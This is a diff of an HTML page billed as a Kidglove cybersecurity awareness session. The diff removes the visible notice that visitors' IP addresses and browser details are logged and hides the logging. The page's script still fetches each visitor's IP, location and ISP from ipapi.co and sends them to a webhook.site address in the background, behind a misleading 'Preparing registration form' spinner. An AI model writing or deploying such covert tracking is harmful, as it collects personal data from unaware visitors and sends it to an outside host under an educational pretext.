@@ -127,20 +127,16 @@
 </head>
 <body>
     <div class="container">
-        <h1>📋 Student Registration</h1>
-        <p class="subtitle">Please complete the registration form</p>
+        <h1>🎓 Welcome to Kidglove</h1>
+        <p class="subtitle">Cybersecurity Awareness Session</p>
+
+        <div class="info-box">
+            <strong>👋 Welcome!</strong> This is an interactive cybersecurity awareness session by Kidglove. You're about to learn how data is collected online. Let's begin!
+        </div>
 
         <div class="loading">
             <span class="spinner"></span>
-            Accessing your information...
-        </div>
-
-        <div class="info-box">
-            <strong>ℹ️ Notice:</strong> This is a cybersecurity awareness demonstration. Your IP address and browser information is being logged for educational purposes to show how data can be tracked when you visit websites.
-        </div>
-
-        <div class="ip-display" id="ipInfo">
-            Retrieving your IP address...
+            Preparing registration form...
         </div>
 
         <div id="formSection" style="display: none;">
@@ -154,28 +150,21 @@
     </div>
 
     <script>
-        // CONFIGURED URLs
+        // CONFIGURED URLs - Kidglove Session
         const WEBHOOK_URL = 'https://webhook.site/0d369f29-e19c-445c-a521-3d7e6464701c';
-        const FORM_URL = 'https://forms.gle/PapZpYfRkc3Siaow5';
+        const FORM_URL = 'https://docs.google.com/forms/d/1hueZxEWgLFWbSLC_AJfBmMEEO2Qbp_1NxFm_il_mJMQ/viewform';
 
-        // Capture and log IP address
+        // Capture and log IP address (background, no display)
         async function captureIP() {
             try {
-                // Get IP from webhook.site logs
+                // Get IP from ipapi.co
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
 
-                document.getElementById('ipInfo').innerHTML = `
-                    <strong>Your Information:</strong><br>
-                    IP Address: <strong>${data.ip}</strong><br>
-                    Location: ${data.city}, ${data.country_name}<br>
-                    ISP: ${data.org}<br>
-                    Device: ${navigator.userAgent.substring(0, 80)}...
-                `;
-
-                // Log to webhook
+                // Log to webhook in background
                 await logToWebhook(data);
 
+                // Show form section
                 document.getElementById('formSection').style.display = 'block';
                 document.querySelector('.loading').style.display = 'none';
 
@@ -184,7 +173,10 @@
 
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('ipInfo').innerHTML = `<strong>IP Detection Error</strong><br>Please refresh the page.`;
+                // Still show form even if IP detection fails
+                document.getElementById('formSection').style.display = 'block';
+                document.querySelector('.loading').style.display = 'none';
+                document.getElementById('formLink').href = FORM_URL;
             }
         }
 
